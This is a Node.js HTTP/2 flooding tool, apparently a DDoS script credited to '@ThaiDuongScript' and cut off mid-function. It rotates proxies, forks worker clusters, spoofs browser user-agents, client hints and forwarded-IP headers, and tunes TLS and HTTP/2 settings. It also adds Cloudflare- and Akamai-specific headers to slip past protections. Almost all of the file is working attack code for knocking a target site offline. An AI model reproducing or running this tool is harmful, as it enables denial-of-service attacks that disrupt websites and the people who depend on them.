const url = require('url')
	, fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
   , net = require('net')
	, cluster = require('cluster')
   , request = require('request')
   , UserAgent = require('user-agents')
//random ua by thaiduong
const crypto = require('crypto');
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const os = require('os');
const HPACK = require('hpack');
const currentTime = new Date();
const httpTime = currentTime.toUTCString();


	
const Buffer = require('buffer').Buffer;



const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}
function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}
  
var parsed = url.parse(process.argv[2]);
const lookupPromise = util.promisify(dns.lookup);
let val 
let isp
let pro
async function getIPAndISP(url) {
  try {
    const { address } = await lookupPromise(url);
    const apiUrl = `http://ip-api.com/json/${address}`;
    const response = await fetch(apiUrl);
    if (response.ok) {
      const data = await response.json();
       isp = data.isp;
      console.log('ISP ', url, ':', isp);
	  if (isp === 'Cloudflare, Inc.') {
		 pro =[ 
			{'Methods' : ''},
		    {'Quic-Version' : '0x00000001'},
			
		]
		  val = { 'NEl': Math.random() < 0.5 ? JSON.stringify({
			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
			"include_subdomains": Math.random() < 0.5 ? true : false}) : JSON.stringify({
	  "success_fraction":0,
      "report_to":Math.random() < 0.5 ? "cf-nel" : 'default',
      "max_age":604800}),
		  }
	  }else if (isp === 'Akamai Technologies, Inc.' && 'Akamai International B.V.') {
		 pro = {'Quic-Version' : '0x00000001'}
		val = { 'NEl': JSON.stringify({
			"report_to":"default",
			"max_age":3600,
			"include_subdomains":true}),
		  }
	  } else {
		val = {'Etag': "71735e063326b9646d2a4f784ac057ff"}
		pro = {'Strict-Transport-Security': 'max-age=31536000'}
           
	  }
    } else {
     return
    }
  } catch (error) {
    return
  }
}

const targetURL = parsed.host; 

getIPAndISP(targetURL);

try {
	var colors = require('colors');
} catch (err) {
	console.log('\x1b[36mInstalling\x1b[37m the requirements');
	execSync('npm install colors');
	console.log('Done.');
	process.exit();
}
cplist = [
		'TLS_AES_256_GCM_SHA384',
		'TLS_CHACHA20_POLY1305_SHA256',
		'TLS_AES_128_GCM_SHA256',
		, ]
const sigalgs = [
	'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
	, 'ecdsa_brainpoolP256r1tls13_sha256'
	, 'ecdsa_brainpoolP384r1tls13_sha384'
	, 'ecdsa_brainpoolP512r1tls13_sha512'
	, 'ecdsa_sha1'
	, 'ed25519'
	, 'ed448'
	, 'ecdsa_sha224'
	, 'rsa_pkcs1_sha1'
	, 'rsa_pss_pss_sha256'
	, 'dsa_sha256'
	, 'dsa_sha384'
	, 'dsa_sha512'
	, 'dsa_sha224'
	, 'dsa_sha1'
	, 'rsa_pss_pss_sha384'
	, 'rsa_pkcs1_sha2240'
	, 'rsa_pss_pss_sha512'
	, 'sm2sig_sm3'
	, 'ecdsa_secp521r1_sha512'
, ];
let sig = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
, }

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
function randomIp() {
	const segment1 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? nh?t (0-255)
	const segment2 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? hai (0-255)
	const segment3 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? ba (0-255)
	const segment4 = Math.floor(Math.random() * 256); // Ph?n ?o?n th? t? (0-255)
	return `${segment1}.${segment2}.${segment3}.${segment4}`;
}
const blockedDomain = ["https://chinhphu.vn"];
const blocked = [".gov"];
const blocked2 = [".edu"];
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = process.argv[7];
let query = process.argv[8];

if (target == blockedDomain) {
console.error('Target was banned by @ThaiDuongScript');
	process.exit(1);
}
if (target.endsWith(blocked)) {
    console.log(`Domain ${blocked} was banned by @ThaiDuongScript`);
    process.exit(1);
}
if (target.endsWith(blocked2)) {
    console.log(`Domain ${blocked2} was banned by @ThaiDuongScript`);
    process.exit(1);
}

// Validate target format
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
	const proxyData = fs.readFileSync(proxyFile, 'utf-8');
	proxys = proxyData.match(/\S+/g);
} catch (err) {
	console.error('Error proxy file:', err.message);
	process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const proxyr = () => {
	return proxys[Math.floor(Math.random() * proxys.length)];
}
//async function editedline() {
  //try {
    // Code to fetch the proxy list can be added here if required
     //const response = await axios.get('https://daudau.org/api/http.txt');
    //const proxyList = response.data;
    //fs.writeFile('http.txt', proxyList, 'utf8', (error) => {
       //if (error) {
        //console.error('Error:', error);
       //} else {
         //console.log('Success save proxy at http.txt!');
       //}
    //});
  //} catch (error) {
    //console.error(' Error:', error);
  //}
//}

//editedline();


if (cluster.isMaster) {
	console.clear()
	
 
    console.log(" \n Attack Start \n @ThaiDuongScript wanna fuck cloudflare \n HTTP/2 RST v1.1 \n\n   -> Target ( " + target + " ) \n   -> Time ( " + time + " seconds ) \n   -> Threads ( " + thread + " core ) \n   -> Ratelimit ( " + rps + " rq/s ) \n   -> Proxies ( " + proxyFile + " ) \n");
process.stdout.write("Loading: 10%\n");
setTimeout(() => {
  process.stdout.write("\rLoading: 50%\n");
}, 500 * time );

setTimeout(() => {
  process.stdout.write("\rLoading: 100%\n");
}, time * 1000);
	for (let i = 0; i < thread; i++) {
		cluster.fork();
	}
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	if (input === 'flood') {
	const abu =	setInterval(function() {
			flood()
		}, 1);
	}else {
	setInterval(flood)
}
}


async function flood() {
	var parsed = url.parse(target);
	var cipper = headerFunc.cipher();
	
	var proxy = proxyr().split(':');
	var randIp = randomIp();
	let interval
	if (input === 'flood') {
	  interval = 100;
	} else if (input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  
	  // T?o m?t ?? tr? ng?u nhi?n t? 1000 ??n 5000 mili gi?y
	  interval = randomDelay(1000, 5000);
	} else {
	  interval = 1000;
	}
  
  
	  
	const mediaTypes = [
		'text/html'
		, 'application/xhtml+xml'
		, 'application/xml'
		, 'image/avif'
		, 'image/webp'
		, 'image/apng'
		, '/'
		, 'application/signed-exchange'
	];
	const acceptValues = [];
	mediaTypes.forEach((type, index) => {
		const quality = index === 0 ? 1 : (Math.random() * 0.9 + 0.1).toFixed(1);
		acceptValues.push(`${type};q=${quality}`);
	});
	const acceptHeader = acceptValues.join(',');
	  
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
	
	function aString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
	const randstrsValue = randstr(25);
	
 	

	const rateHeaders = [
{ "te" : "trailers"},
{ "origin": "https://" + parsed.host  },
{ "referer": "https://" + parsed.host + '/' },
{ "source-ip": randIp  },
{ "viewport-height":"1080"  },
{ "viewport-width": "1920"  },
{ "device-memory": "0.25"  },
];
const rateHeaders2 = [
{ "dnt": "1"  },
{ "device-memory": "0.25"  },
{ "accept-charset": "UTF-8" },
{"Vary" : randstr(15)},
{"Via" : randstr(15)},
{"X-Forwarded-For" : randomIp},
];

const braveHeaders = {
    'X-Brave-Referrer': Math.random() < 0.3 ? 'https://www.google.com/' : undefined,
    'X-Brave-Vary': Math.random() < 0.3 ? 'Accept-Encoding' : undefined,
    'X-Brave-LastModified': Math.random() < 0.3 ? new Date().toUTCString() : undefined,
  };

     
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
const a = getRandomInt(108,131);
const b = getRandomInt(108,128);
const c = getRandomInt(108,129);
const d = getRandomInt(108,131);
const e = getRandomInt(108,127);
var operatingSystems = ["Windows NT 10.0", "Macintosh", "X11"];
var architectures = {
  "Windows NT 10.0": `Win64; x64`,
  "Macintosh": `Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}`  ,
  "X11": Math.random() < 0.5 ? `Linux x86_64; rv:${a}.0` : `Linux x86_64`
};



function getRandomValue(arr) {
  const randomIndex = Math.floor(Math.random() * arr.length);
  return arr[randomIndex];
}

const randomOS = getRandomValue(operatingSystems);
const randomArch = architectures[randomOS]; 


var uas =  `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a}.0.0.0 Safari/537.36`
var ua1 = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${b}.0.0.0 Safari/537.36 Edg/${b}`
var ua2 = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${c}.0.0.0 Safari/537.36 OPR/${c}`
var uass = `Mozilla/5.0 (${randomOS}; ${randomArch}; rv:${d}.0) Gecko/20100101 Firefox/${d}`

var uasss = `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${e}.0.0.0 Safari/537.36 Brave/${e}.0.0.0`
var ch_ua = `"\"Google Chrome\";v=\"${a}\", \"Chromium\";v=\"${a}\", \"Not:A-Brand\";v=\"99\""
`

let ch_ua_v;
    if (randomOS === "Windows NT 10.0") {
        ch_ua_v = `Windows`;
    }
else if (randomOS === "Macintosh") {
        ch_ua_v = `macOSX`;
    }
 else if (randomOS === "X11") {
        ch_ua_v = `Linux`;
    }


const ch_ua_ver = `${ch_ua_v}`;
console.log(uas)
console.log(ch_ua_ver)
const accept_header = [
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
];

lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-ZA'
];

const encoding_header = [
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
];

var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
function shuffleObject(obj) {
					const keys = Object.keys(obj);
				  
					for (let i = keys.length - 1; i > 0; i--) {
					  const j = Math.floor(Math.random() * (i + 1));
					  [keys[i], keys[j]] = [keys[j], keys[i]];
					}
				  
					const shuffledObject = {};
					for (const key of keys) {
					  shuffledObject[key] = obj[key];
					}
				  
					return shuffledObject;
				  }
   hd = {}
     header = {
    ':method': 'GET'
		, ':authority': parsed.host
		, 'x-forwarded-proto':'https'
  };
  if (query === 'true'){
  header[':path'] = Math.random() < 0.5 ? parsed.path + '?cf_chl=' +randstr(5) + '=' + randstr(15) : parsed.path + '?' + 'https://www.gooogle.com/page=' + randstr(5) + '=' + randstr(10) + '?abcxyz=' + randstr(3) + 'GoogleBot' + randstr(2) ;

  }else if (query === 'false'){
	header[':path']=parsed.path;
  }else{
	header[':path']=parsed.path + '?' + randstr(5) + '=' + randstr(20) ;
  }
  

header[':scheme']= 'https';
header['accept-encoding'] = encoding;
header['accept-language'] = lang;
header['accept'] = accept;
header['sec-fetch-mode'] = 'navigate';
header['sec-fetch-dest'] = 'document';
header['sec-fetch-site'] = 'same-origin';
header['sec-fetch-user'] = '?1';
header['cache-control']= Math.random() < 0.5 ? 'no-cache, no-store' : `max-age=0`;
header['upgrade-insecure-requests']= '1';
header['Cf-Cache-Status'] = 'DYNAMIC';
header['Cf-Ray'] = randstr(20) + "-" + randstr(3);
header['Sec-CH-UA'] = ch_ua_ver;
const brw = ['chrome','firefox','edge','macos','linux','brave','opera']
let dynHeaders
let ci
let bruh 
async function rand() {
	var browser = brw[Math.floor(Math.random() * brw.length)]
	if (browser === 'chrome') {
    
	 dynHeaders = {
		...hd[Math.floor(Math.random() * hd.length)], 
		...header,
		'User-Agent':  uas,
		...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
		...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
...val,
...pro,
		
					  };
					}else if (browser === 'firefox'){
						
						dynHeaders = {
							...hd[Math.floor(Math.random() * hd.length)], 
							...header,
							'User-Agent':  uass,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
...val,
...pro,
										  };
					} else if (browser === 'edge') {
						
						dynHeaders = {
							...hd[Math.floor(Math.random() * hd.length)], 
							...header,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							'User-Agent':  ua1,
...val,
...pro,
										  };
					} else if (browser === 'linux') {
						dynHeaders = {
							
							...header,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							'User-Agent':  uas,
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd[Math.floor(Math.random() * hd.length)], 
...val,
...pro,
										  };
					} else if (browser === 'opera') {
						dynHeaders = {
							
							...header,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							'User-Agent':  ua2,
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd[Math.floor(Math.random() * hd.length)], 
...val,
...pro,
                               };
					} else if (browser === 'macos') {
						dynHeaders = {
							...header,
							
							...(Math.random() < 0.5 ? {} : rateHeaders[Math.floor(Math.random() * rateHeaders.length)]),
							'User-Agent':  uas,
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd[Math.floor(Math.random() * hd.length)], 
...val,
...pro,
										  };
					} else if (browser === 'brave') {
						dynHeaders = {
							...header,
							
							...(Math.random() < 0.5 ? {} : rateHeaders[Math.floor(Math.random() * rateHeaders.length)]),
							'User-Agent':  uasss,
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
							...hd[Math.floor(Math.random() * hd.length)], 
                   ...braveHeaders[Math.floor(Math.random() * braveHeaders.length)],
...val,
...pro,
										  };
					} else {
						dynHeaders = {
							...hd[Math.floor(Math.random() * hd.length)], 
							...header,
							'User-Agent':  uas,
							...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
							...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
...val,
...pro,
										  };
					}
					return dynHeaders
	
}
rand()
                
	const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.host + ':443'
		, timeout: 5000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'close'
		, 'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`
    ,}
	, };
	connection = http.request(Optionsreq, (res) => {});
	const TLSOPTION = {
		ciphers: cipper
		, minVersion: 'TLSv1.2'
    ,maxVersion: 'TLSv1.3'
		, sigals: sig
		, secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
		, echdCurve: "X25519"
    ,maxRedirects: 20
    ,followAllRedirects: true
		, secure: true
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2']
	, };

	function createCustomTLSSocket(parsed, socket) {
    const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setMaxListeners(0);

    return tlsSocket;
}
async function generateJA3Fingerprint(socket) {
    if (!socket.getCipher()) {
        console.error('Cipher info is not available. TLS handshake may not have completed.');
        return null;
    }

    const cipherInfo = socket.getCipher();
    const supportedVersions = socket.getProtocol();
    const tlsVersion = supportedVersions.split('/')[0];

    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${tlsVersion}:${cipherInfo.bits}`;
    const md5Hash = crypto.createHash('md5');
    md5Hash.update(ja3String);

    return md5Hash.digest('hex');
}
 function taoDoiTuongNgauNhien() {
  const doiTuong = {};
  function getRandomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
maxi = getRandomNumber(1,4)
  for (let i = 1; i <=maxi ; i++) {
    
    
 const key = 'custom-sec-'+ generateRandomString(1,9)

    const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)

    doiTuong[key] = value;
  }

  return doiTuong;
}
	 
	connection.on('connect', function (res, socket) {
    const tlsSocket = createCustomTLSSocket(parsed, socket);
    socket.setKeepAlive(true, 100000);
let ja3Fingerprint; 


function getJA3Fingerprint() {
    return new Promise((resolve, reject) => {
        tlsSocket.on('secureConnect', () => {
            ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
            resolve(ja3Fingerprint); 
        });

        
        tlsSocket.on('error', (error) => {
            reject(error); 
        });
    });
}

async function main() {
    try {
        const fingerprint = await getJA3Fingerprint();  
        headers['ja3-fingerprint']= fingerprint  
    } catch (error) {
        
    }
}


main();
    let clasq = shuffleObject({
    ...(Math.random() < 0.5 ? { headerTableSize: 655362 } : {}),
    ...(Math.random() < 0.5 ? { maxConcurrentStreams: 1000 } : {}),
    enablePush: false,
    ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
    ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
    ...(Math.random() < 0.5 ? { initialWindowSize: 6291456 } : {}),
    ...(Math.random() < 0.5 ? { maxHeaderListSize: 262144 } : {}),
    ...(Math.random() < 0.5 ? { maxFrameSize: 16384 } : {})
});

function incrementClasqValues() {
    if (clasq.headerTableSize) clasq.headerTableSize += 1;
    if (clasq.maxConcurrentStreams) clasq.maxConcurrentStreams += 1;
    if (clasq.initialWindowSize) clasq.initialWindowSize += 1;
    if (clasq.maxHeaderListSize) clasq.maxHeaderListSize += 1;
    if (clasq.maxFrameSize) clasq.maxFrameSize += 1;
    return clasq;
}
setInterval(() => {
    incrementClasqValues();
    const payload = Buffer.from(JSON.stringify(clasq));
    const frames = encodeFrame(0, 4, payload, 0);
}, 10000);
    let hpack = new HPACK();
    hpack.setTableSize(4096);

    const clients = [];
    const client = http2.connect(parsed.href, {
		
		settings: incrementClasqValues(),
    "unknownProtocolTimeout": 10,
    "maxReservedRemoteStreams": 4000,
    "maxSessionMemory": 200,
   createConnection: () => tlsSocket
	});
clients.push(client);
client.setMaxListeners(0);
const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    client.on('connect', () => {
        client.ping((err, duration, payload) => {
            if (err) {
            } else {
            }
        });
        
    });

    clients.forEach(client => {
        const intervalId = setInterval(async () => {
            const requests = [];
            const requests1 = [];
            let count = 0;
            let streamId =1;
            let streamIdReset = 0;
            let currenthead = 0;
			const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
      
      const headers2 = (currenthead) => {
                let updatedHeaders = {};
                currenthead += 1;
            
                switch (currenthead) {
                    case 1:
                        updatedHeaders["sec-ch-ua"] = `${randomString}`;
                        break;
                    case 2:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = `${randomString}`;
                        break;
                    case 3:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `${randomString}`;
                        break;
                    case 4:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = `${randomString}`;
                        break;
                    case 5:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        break;
                    case 6:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = `${randomString}`;
                        break;
                    case 7:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = `${randomString}`;
                        break;
                    case 8:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = "none";
                        updatedHeaders["sec-fetch-mode"] = `${randomString}`;
                        break;
                    case 9:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = "none";
                        updatedHeaders["sec-fetch-mode"] = "navigate";
                        updatedHeaders["sec-fetch-user"] = `${randomString}`;
                        break;
                    case 10:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = "none";
                        updatedHeaders["sec-fetch-mode"] = "navigate";
                        updatedHeaders["sec-fetch-user"] = "?1";
                        updatedHeaders["sec-fetch-dest"] = `${randomString}`;
                        break;
                    case 11:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = "none";
                        updatedHeaders["sec-fetch-mode"] = "navigate";
                        updatedHeaders["sec-fetch-user"] = "?1";
                        updatedHeaders["sec-fetch-dest"] = "document";
